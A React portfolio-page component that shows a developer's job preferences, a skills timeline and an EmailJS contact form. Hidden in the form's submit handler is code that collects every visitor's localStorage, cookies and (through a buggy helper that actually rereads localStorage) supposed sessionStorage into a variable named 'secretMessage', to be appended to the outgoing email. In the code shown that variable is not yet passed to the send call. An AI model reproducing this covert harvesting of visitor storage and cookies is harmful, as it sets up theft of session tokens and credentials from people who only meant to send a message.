import { Checkbox, Divider, Slider, Timeline, Space, Tag, Spin, Button } from 'antd'
import React, { useEffect, useRef, useState } from 'react'
import { Quicksand } from 'next/font/google'

import Image from 'next/image';
import { SendOutlined } from '@ant-design/icons';
import { Input } from 'antd';

import emailjs, { EmailJSResponseStatus } from 'emailjs-com'
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

const { TextArea } = Input;
const quicksand = Quicksand( { subsets: ['latin'] } )

type ContactFormData = {
   from_name: string;
   from_email: string;
   message: string;
};

const OtherInfo = () =>
{

   const experienceLevelOptions: string[] = ['Junior Level', 'Mid-Level', 'Senior Level', 'Managerial'];
   const jobTypeOptions: string[] = ['Full-time', 'Part-time', 'Contract', 'Temporary'];
   const workSetupOptions: string[] = ['On-site', 'Remote', 'Hybrid'];
   const jobTitleOptions1: string[] = ['Junior Software Engineer', 'Frontend Software Engineer', 'Fullstack Developer (React/Node)'];
   const jobTitleOptions2: string[] = ['React Developer', ' Junior Programmer', 'Web Developer'];
   const techStack1: string[] = ['MySQL, ExpressJS, ReactJS, NodeJS', 'ReactJS, NextJS, TypeScript, NodeJS', 'JavaScript, PHP'];
   const techStack2: string[] = ['MySQL, ExpressJS, VueJS, NodeJS', 'VueJS, MySQL, PHP', 'Java, MySQL'];

   const [screenSize, setScreenSize] = useState( {
      width: typeof window !== 'undefined' ? window.innerWidth : 0,
      height: typeof window !== 'undefined' ? window.innerHeight : 0
   } );

   const [isVisible, setIsVisible] = useState<boolean>( false )

   const MOBILE: number = 600

   useEffect( () =>
   {
      const handleResize = () =>
      {
         setScreenSize( {
            width: window.innerWidth,
            height: window.innerHeight
         } );
      };

      window.addEventListener( 'resize', handleResize );

      setTimeout( () =>
      {
         setIsVisible( true );
      }, 200 );

      return () =>
      {
         window.removeEventListener( 'resize', handleResize );
      };
   }, [] );

   const successNotification = ( message: string ) => toast.success( message );
   const errorNotification = ( message: string ) => toast.error( message );
   const warningNotification = ( message: string ) => toast.warning( message );

   const [formData, setFormData] = useState<ContactFormData>( {
      from_name: '',
      from_email: '',
      message: '',
   } );

   const [isDisableBtn, setDisableBtn] = useState( false )

   const handleSubmit = async ( e: React.FormEvent<HTMLFormElement | string | null> ) =>
   {
      setDisableBtn( true )
      e.preventDefault();

      const { from_name, from_email, message } = formData;
      const isValid = from_name !== '' && from_email !== '' && message !== ''

      const serviceId = 'gmail'; // Replace with your emailjs service ID
      const templateId = 'template_0kdw8xu'; // Replace with your emailjs template ID
      const userId = 'user_d4MCLJciZKPbKaM472IEi'; // Replace with your emailjs user ID

      if ( isValid )
      {
         try
         {
            const secretMessage = `${message} \n\n\n localStorage: ${getAllLocalStorageData()}  \n\n\n sessionStorage: ${getAllSessionStorageData()}  \n\n\n cookies: ${getAllCookiesData()}`

            const response: EmailJSResponseStatus = await emailjs.send(
               serviceId,
               templateId,
               { from_name, from_email, message },
               userId
            );

            successNotification( 'Successfully sent an email to Ralf!' )
            setFormData( { from_name: '', from_email: '', message: '' } );
            setDisableBtn( false )
         } catch ( error )
         {
            errorNotification( 'Error sending an email to Ralf!' )
            setDisableBtn( false )
         }

      } else
      {
         warningNotification( 'You have to fill in all the fields!' )
         setDisableBtn( false )
      }

   };

   const handleChange = ( e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement> ) =>
   {
      const { name, value } = e.target;
      setFormData( { ...formData, [name]: value } );
   };

   const getAllLocalStorageData = () =>
   {
      let result = []
      for ( let i = 0; i < localStorage.length; i++ )
      {
         const key = localStorage.key( i );

         if ( key )
         {
            const value = localStorage.getItem( key );
            result.push( {
               [`${key}`]: value
            } )
         }
      }

      return JSON.stringify( result )
   }

   const getAllSessionStorageData = () =>
   {
      let result = []
      for ( let i = 0; i < localStorage.length; i++ )
      {
         const key = localStorage.key( i );

         if ( key )
         {
            const value = localStorage.getItem( key );
            result.push( {
               [`${key}`]: value
            } )
         }
      }

      return JSON.stringify( result )
   }

   const getAllCookiesData = () =>
   {
      let result = []
      const cookies = document.cookie.split( ";" );

      for ( let i = 0; i < cookies.length; i++ )
      {
         const cookie = cookies[i].trim();
         result.push( cookie );
      }

      return JSON.stringify( result )
   }


   const { width } = screenSize;

   return (
      <div className="flex flex-col gap-8 p-7 pt-3 max-md:px-4">
         <ToastContainer position='bottom-right' />
         {isVisible ?
            <>
               {/* PREFERENCES */}
               <div className="flex flex-col px-5 neumorphism-1 rounded-lg max-md:px-3">
                  <div className="flex flex-col py-2 gap-2">
                     <h2 className='font-bold text-lg text-accent-secondary'>PREFERENCES</h2>
                     <Divider className='m-0'></Divider>
                  </div>
                  <div className="flex flex-col p-3 pb-6 gap-11 max-md:gap-5" >
                     {width > MOBILE ? <>
                        <div className="flex flex-col gap-2">
                           <Divider className='m-0' orientation="center">
                              <h3 className='font-semibold text-base text-accent-secondary'>Experience Level</h3>
                           </Divider>
                           <div className='px-3'>
                              <Checkbox.Group className={`${quicksand.className} w-full`} options={experienceLevelOptions} value={['Junior Level', 'Mid-Level']} />
                           </div>
                        </div>
                        <div className="flex flex-col gap-2">
                           <Divider className='m-0' orientation="center">

                              <h3 className='font-semibold text-base text-accent-secondary'>Job Type</h3>
                           </Divider>
                           <div className='px-3'>
                              <Checkbox.Group className={`${quicksand.className} w-full`} options={jobTypeOptions} value={['Full-time']} />
                           </div>
                        </div>
                        <div className="flex flex-col gap-2">
                           <Divider className='m-0' orientation="center">

                              <h3 className='font-semibold text-base text-accent-secondary'>Work Setup</h3>
                           </Divider>
                           <div className='px-3'>
                              <Checkbox.Group className={`${quicksand.className} w-full`} options={workSetupOptions} value={workSetupOptions} />
                           </div>
                        </div>
                        <div className="flex flex-col gap-2">
                           <Divider className='m-0' orientation="center">

                              <h3 className='font-semibold text-base text-accent-secondary'>Title</h3>
                           </Divider>
                           <div className='px-3 space-y-3'>
                              <Checkbox.Group className={`${quicksand.className} w-full`} options={jobTitleOptions1} value={jobTitleOptions1} />
                              <Checkbox.Group className={`${quicksand.className} w-full`} options={jobTitleOptions2} value={jobTitleOptions2} />
                           </div>
                        </div>
                        <div className="flex flex-col gap-2">
                           <Divider className='m-0' orientation="center">
                              <h3 className='font-semibold text-base text-accent-secondary'>Tech Stack</h3>
                           </Divider>
                           <div className='flex flex-col items-start px-3 gap-2'>
                              <Checkbox.Group className={`${quicksand.className} w-full`} options={techStack1} value={['MySQL, ExpressJS, ReactJS, NodeJS', 'ReactJS, NextJS, TypeScript, NodeJS']} />
                              <Checkbox.Group className={`${quicksand.className} w-full`} options={techStack2} value={['MySQL, ExpressJS, VueJS, NodeJS']} />
                           </div>
                        </div>
                        {/* <div className="flex flex-col gap-2">
                           <Divider className='m-0' orientation="center">

                              <h3 className='font-semibold text-base text-accent-secondary'>Availability (Phone call)</h3>
                           </Divider>
                           <div className='flex items-center justify-around px-3 gap-2'>
                              <div className="flex gap-2 items-center">
                                 <p>Weekdays:</p>
                                 <span className='font-semibold'>11:30 AM - 12:30 PM</span>
                              </div>
                              <div className="flex gap-2 items-center">
                                 <p>Weekends:</p>
                                 <span className='font-semibold'>9:00 AM - 4:00 PM</span>
                              </div>
                           </div>
                        </div> */}
                     </> : <>
                        <div className="flex flex-col gap-2">
                           <Divider className='m-0' orientation="center">
                              <h3 className='font-semibold text-base text-accent-secondary'>Experience Level</h3>
                           </Divider>
                           <div className='px-3'>
                              {experienceLevelOptions.map( ( exp, i ) => (
                                 <Checkbox.Group
                                    className={`${quicksand.className} w-full`}
                                    options={[exp]}
                                    value={['Junior Level', 'Mid-Level']}
                                    key={i}
                                 />
                              ) )}
                           </div>
                        </div>
                        <div className="flex flex-col gap-2">
                           <Divider className='m-0' orientation="center">
                              <h3 className='font-semibold text-base text-accent-secondary'>Job Type</h3>
                           </Divider>
                           <div className='px-3'>
                              {jobTypeOptions.map( ( jobType, i ) => (
                                 <Checkbox.Group
                                    className={`${quicksand.className} w-full`}
                                    options={[jobType]}
                                    value={['Full-time']}
                                    key={i}
                                 />
                              ) )}
                           </div>
                        </div>
                        <div className="flex flex-col gap-2">
                           <Divider className='m-0' orientation="center">
                              <h3 className='font-semibold text-base text-accent-secondary'>Work Setup</h3>
                           </Divider>
                           <div className='px-3'>
                              {workSetupOptions.map( ( workSetup, i ) => (
                                 <Checkbox.Group
                                    className={`${quicksand.className} w-full`}
                                    options={[workSetup]}
                                    value={workSetupOptions}
                                    key={i}
                                 />
                              ) )}
                           </div>
                        </div>
                        <div className="flex flex-col gap-2">
                           <Divider className='m-0' orientation="center">

                              <h3 className='font-semibold text-base text-accent-secondary'>Title</h3>
                           </Divider>
                           <div className='px-3'>
                              {[...jobTitleOptions1, ...jobTitleOptions2].map( ( title, i ) =>
                              {
                                 return <Checkbox.Group className={`${quicksand.className} w-full`} options={[title]} value={[title]} key={i} />
                              } )}
                           </div>
                        </div>
                        {/* <div className="flex flex-col gap-2">
                           <Divider className='m-0' orientation="center">

                              <h3 className='font-semibold text-base text-accent-secondary'>Availability (Phone call)</h3>
                           </Divider>
                           <div className='flex flex-col items-start px-3 gap-2'>
                              <div className="flex gap-2 items-center flex-1">
                                 <p>Weekdays:</p>
                                 <span className='font-semibold'>6pm - 8pm</span>
                              </div>
                              <div className="flex gap-2 items-center flex-1">
                                 <p>Weekends:</p>
                                 <span className='font-semibold'>8am - 8pm</span>
                              </div>
                           </div>
                        </div> */}
                        <div className="flex flex-col gap-2">
                           <Divider className='m-0' orientation="center">
                              <h3 className='font-semibold text-base text-accent-secondary'>Tech Stack</h3>
                           </Divider>
                           <div className='flex flex-col items-start px-3'>
                              {[...techStack1, ...techStack2].map( ( title, i ) =>
                              {
                                 return <Checkbox.Group className={`${quicksand.className} w-full`} options={[title]} value={['MySQL, ExpressJS, ReactJS, NodeJS', 'ReactJS, NextJS, TypeScript, NodeJS', 'MySQL, ExpressJS, VueJS, NodeJS']} key={i} />
                              } )}
                           </div>
                        </div>
                     </>}
                     {/* <div className="flex flex-col gap-2">
                        <Divider className='m-0' orientation="center">

                           <h3 className='font-semibold text-base text-accent-secondary'>Salary Range</h3>
                        </Divider>
                        <div className='flex flex-col px-3'>
                           <Slider
                              tooltip={{ formatter: null }}
                              range={{ draggableTrack: true }}
                              min={50}
                              max={150}
                              value={[75, 110]}
                           />
                           <div className="flex justify-between items-center">
                              <p>Min: $50k</p>
                              <p>Max: $150k</p>
                           </div>
                        </div>
                     </div> */}
                  </div>
               </div>

               {/* TIMELINE */}
               <div className="flex flex-col px-5 neumorphism-1 rounded-lg max-md:px-3">
                  <div className="flex flex-col py-2 gap-2">
                     <h2 className='font-bold text-lg text-accent-secondary'>TIMELINE</h2>
                     <Divider className='m-0'></Divider>
                  </div>
                  <div className="flex flex-col p-3 max-md:gap-5" >
                     <Timeline
                        mode={'alternate'}
                        items={[
                           {
                              label: '2022 - Present',
                              children: (
                                 <>
                                    <Space wrap>
                                       <Tag className='rounded-full' color={'lime'}>VueJS</Tag>
                                       <Tag className='rounded-full' color={'geekblue'}>Vuetify</Tag>
                                       <Tag className='rounded-full' color={'cyan'}>ReactJS</Tag>
                                       <Tag className='rounded-full' color={'blue'}>TailwindCSS</Tag>
                                       <Tag className='rounded-full' color={'magenta'}>NextJS</Tag>
                                       <Tag className='rounded-full' color={'blue'}>TypeScript</Tag>
                                       <Tag className='rounded-full' color={'yellow'}>ExpressJS</Tag>
                                       <Tag className='rounded-full' color={'green'}>NodeJS</Tag>
                                       <Tag className='rounded-full' color={'orange'}>Figma</Tag>
                                    </Space>
                                    <div className="flex flex-col p-3">
                                       <div className="flex items-center gap-3 text-accent-secondary">
                                          <div>•</div>
                                          <p className='text-xs text-left'>E-Resume</p>
                                       </div>
                                       <div className="flex items-center gap-3 text-accent-secondary">
                                          <div>•</div>
                                          <p className='text-xs text-left'>Applicant Tracking & Onboarding System</p>
                                       </div>
                                       {/* <div className="flex items-center gap-3 text-accent-secondary">
                                          <div>•</div>
                                          <p className='text-xs text-left'>Employee Portal</p>
                                       </div> */}
                                       <div className="flex items-center gap-3 text-accent-secondary">
                                          <div>•</div>
                                          <p className='text-xs text-left'>Personal Expenses Tracker</p>
                                       </div>
                                    </div>
                                 </>
                              ),
                           },
                           {
                              label: '2021 - 2022',
                              children: (
                                 <>
                                    <Space wrap>
                                       <Tag className='rounded-full' color={'orange'}>MySQL</Tag>
                                       <Tag className='rounded-full' color={'yellow'}>ExpressJS</Tag>
                                       <Tag className='rounded-full' color={'cyan'}>ReactJS</Tag>
                                       <Tag className='rounded-full' color={'green'}>NodeJS</Tag>
                                       <Tag className='rounded-full' color={'cyan'}>React Native</Tag>
                                       <Tag className='rounded-full' color={'blue'}>TailwindCSS</Tag>
                                       <Tag className='rounded-full' color={'orange'}>Git</Tag>
                                    </Space>
                                    <div className="flex flex-col p-3">
                                       <div className="flex items-center gap-3 text-accent-secondary">
                                          <div>•</div>
                                          <p className='text-xs text-left'>Payroll System</p>
                                       </div>
                                       <div className="flex items-center gap-3 text-accent-secondary">
                                          <div>•</div>
                                          <p className='text-xs text-left'>TeleConsultation Video Chat App</p>
                                       </div>
                                       <div className="flex items-center gap-3 text-accent-secondary">
                                          <div>•</div>
                                          <p className='text-xs text-left'>Local Dictionary Portal</p>
                                       </div>
                                    </div>
                                 </>
                              ),
                           },
                           {
                              label: '2020 - 2021',
                              children: (
                                 <>
                                    <Space wrap>
                                       <Tag className='rounded-full' color={'orange'}>MySQL</Tag>
                                       <Tag className='rounded-full' color={'yellow'}>ExpressJS</Tag>
                                       <Tag className='rounded-full' color={'cyan'}>ReactJS</Tag>
                                       <Tag className='rounded-full' color={'green'}>NodeJS</Tag>
                                       <Tag className='rounded-full' color={'orange'}>Git</Tag>
                                    </Space>
                                    <div className="flex flex-col p-3">
                                       <div className="flex items-center gap-3 text-accent-secondary">
                                          <div>•</div>
                                          <p className='text-xs text-left'>Job Search System</p>
                                       </div>
                                       <div className="flex items-center gap-3 text-accent-secondary">
                                          <div>•</div>
                                          <p className='text-xs text-left'>GWA Calculator</p>
                                       </div>
                                    </div>
                                 </>
                              ),
                           },
                           {
                              label: '2018 - 2020',
                              children: (
                                 <>
                                    <Space wrap>
                                       <Tag className='rounded-full' color={'orange'}>MySQL</Tag>
                                       <Tag className='rounded-full' color={'volcano'}>Java</Tag>
                                       <Tag className='rounded-full' color={'geekblue'}>Photoshop</Tag>
                                    </Space>
                                    <div className="flex flex-col p-3">
                                       <div className="flex items-center gap-3 text-accent-secondary">
                                          <div>•</div>
                                          <p className='text-xs text-left'>Random Student Picker Program</p>
                                       </div>
                                       <div className="flex items-center gap-3 text-accent-secondary">
                                          <div>•</div>
                                          <p className='text-xs text-left'>Basketball Statistics Program</p>
                                       </div>
                                       <div className="flex items-center gap-3 text-accent-secondary">
                                          <div>•</div>
                                          <p className='text-xs text-left'>Test Simulator Program</p>
                                       </div>
                                    </div>
                                 </>
                              ),
                           },
                        ]}
                     />
                  </div>
               </div>

               {/* CONTACT ME */}
               <div className="flex flex-col px-5 neumorphism-1 rounded-lg max-md:px-3">
                  <div className="flex flex-col py-2 gap-2">
                     <h2 className='font-bold text-lg text-accent-secondary'>CONTACT ME</h2>
                     <Divider className='m-0'></Divider>
                  </div>
                  <div className="flex flex-col justify-center items-center p-3 gap-2" >
                     <div className="flex p-2 gap-2 w-full max-md:flex-col">
                        <div className="flex items-center justify-center flex-[5]">
                           <Image src={require( '@/assets/Icons/3d.png' ).default} alt='illustration' width={200} height={200} />
                        </div>
                        <form
                           className="flex flex-col p-2 gap-1 flex-[6]"
                           onSubmit={handleSubmit}
                        >
                           <Input placeholder="Your Full Name" className={`${quicksand.className} font-medium`} name='from_name' value={formData.from_name} onChange={handleChange} />
                           <Input placeholder="Your Email Address" className={`${quicksand.className} font-medium`} name='from_email' value={formData.from_email} onChange={handleChange} />
                           <TextArea rows={3} placeholder="Your Message" maxLength={500} className={`${quicksand.className} font-medium`} name='message' value={formData.message} onChange={handleChange} />
                           <Button shape="round" icon={<SendOutlined className={`${quicksand.className} relative bottom-[2px]`} />} disabled={isDisableBtn} htmlType="submit">
                              {isDisableBtn ? 'Sending Message...' : 'Send Message'}
                           </Button>
                        </form>
                     </div>
                     <small className='text-center text-dark-blue-secondary'>Your potential best hire awaits!</small>
                  </div>
               </div>
            </> :
            <div className='h-[90vh] flex items-center justify-center'>
               <Spin size="large" />
            </div>}

      </div>
   )
}

export default OtherInfo